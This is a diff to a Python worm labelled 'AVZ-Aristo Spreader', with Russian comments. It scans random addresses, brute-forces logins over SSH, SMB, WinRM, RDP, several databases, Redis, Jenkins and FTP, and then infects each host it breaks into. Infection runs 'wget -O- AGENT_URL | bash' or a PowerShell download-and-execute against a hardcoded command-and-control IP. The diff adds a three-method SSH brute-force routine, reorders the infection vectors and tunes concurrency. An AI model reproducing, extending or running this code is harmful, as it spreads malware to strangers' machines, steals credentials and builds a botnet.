@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# AVZ-Aristo Spreader v26.4 – paramiko, таймауты, прогресс
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests
 from datetime import datetime, timezone, timedelta
 
@@ -9,15 +10,15 @@ if sys.platform != 'win32':
     except:
         pass
 
-logging.getLogger("paramiko").setLevel(logging.CRITICAL)
+logging.getLogger("paramiko").setLevel(logging.WARNING)
 
 C2_HOST = "80.249.146.202"
 C2_PORT = 80
 API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
-MAX_CONCURRENT = 2000
-QUICK_TIMEOUT = 1.5
-BRUTE_TIMEOUT = 2.0
+MAX_CONCURRENT = 1000
+QUICK_TIMEOUT = 2.0
+BRUTE_TIMEOUT = 3.0
 DEFAULT_SCAN_COUNT = 20_000
 PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]
 
@@ -114,7 +115,45 @@ async def probe_port(ip, port):
     except:
         return False
 
-# ===== Векторы (с улучшенным логированием) =====
+# ===== Векторы =====
+async def ssh_brute(ip):
+    try:
+        import asyncssh
+        for u, p in (SUCCESS_CREDS + CREDS[:5]):
+            try:
+                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
+                    await conn.run(f"wget -O- {AGENT_URL} | bash")
+                    save_success_creds(u, p)
+                    return True
+            except:
+                continue
+    except ImportError:
+        pass
+    try:
+        import paramiko
+        for u, p in (SUCCESS_CREDS + CREDS):
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(ip, username=u, password=p, timeout=3, banner_timeout=3, auth_timeout=3, allow_agent=False, look_for_keys=False)
+                client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
+                client.close()
+                save_success_creds(u, p)
+                return True
+            except:
+                continue
+    except ImportError:
+        pass
+    for u, p in CREDS[:10]:
+        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
+        try:
+            subprocess.run(cmd, shell=True, timeout=4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            save_success_creds(u, p)
+            return True
+        except:
+            continue
+    return False
+
 async def smb_brute(ip):
     if sys.platform != 'linux':
         return False
@@ -138,21 +177,6 @@ async def winrm_brute(ip):
                 session = winrm.Session(ip, auth=(u, p), transport='ntlm')
                 result = session.run_ps(f"Invoke-WebRequest -Uri {AGENT_URL} -OutFile C:\\Windows\\Temp\\agent.ps1; C:\\Windows\\Temp\\agent.ps1")
                 if result.status_code == 0:
-                    save_success_creds(u, p)
-                    return True
-            except:
-                continue
-    except ImportError:
-        pass
-    return False
-
-async def ssh_brute_ultra(ip):
-    try:
-        import asyncssh
-        for u, p in (SUCCESS_CREDS + CREDS[:5]):
-            try:
-                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
-                    await conn.run(f"wget -O- {AGENT_URL} | bash")
                     save_success_creds(u, p)
                     return True
             except:
@@ -404,37 +428,33 @@ async def infect(ip, port_stats):
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
+    # SSH
+    if open_ports[1] and await ssh_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
+        return True
     # SMB
     if open_ports[9] and await smb_brute(ip):
         print(f"[{now_str()}] [INFECTED] {ip} via SMB", flush=True)
-        return True
-    # SSH
-    if open_ports[1] and await ssh_brute_ultra(ip):
-        print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
         return True
     # WinRM
     if open_ports[13] and await winrm_brute(ip):
         print(f"[{now_str()}] [INFECTED] {ip} via WinRM", flush=True)
         return True
-    # MSSQL
-    if open_ports[5] and await mssql_brute(ip):
-        print(f"[{now_str()}] [INFECTED] {ip} via MSSQL", flush=True)
+    # RDP
+    if open_ports[8] and await rdp_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via RDP", flush=True)
         return True
     # MySQL
     if open_ports[7] and await mysql_brute(ip):
         print(f"[{now_str()}] [INFECTED] {ip} via MySQL", flush=True)
         return True
+    # MSSQL
+    if open_ports[5] and await mssql_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via MSSQL", flush=True)
+        return True
     # PostgreSQL
     if open_ports[10] and await postgresql_brute(ip):
         print(f"[{now_str()}] [INFECTED] {ip} via PostgreSQL", flush=True)
-        return True
-    # RDP
-    if open_ports[8] and await rdp_brute(ip):
-        print(f"[{now_str()}] [INFECTED] {ip} via RDP", flush=True)
-        return True
-    # VNC
-    if open_ports[11] and await vnc_brute(ip):
-        print(f"[{now_str()}] [INFECTED] {ip} via VNC", flush=True)
         return True
     # Redis
     if open_ports[14] and await exploit_redis(ip):
@@ -443,10 +463,6 @@ async def infect(ip, port_stats):
     # Jenkins
     if open_ports[15] and await exploit_jenkins(ip):
         print(f"[{now_str()}] [INFECTED] {ip} via Jenkins", flush=True)
-        return True
-    # Elasticsearch
-    if open_ports[17] and await exploit_elasticsearch(ip):
-        print(f"[{now_str()}] [INFECTED] {ip} via Elasticsearch", flush=True)
         return True
     # FTP
     if open_ports[0] and await ftp_brute(ip):
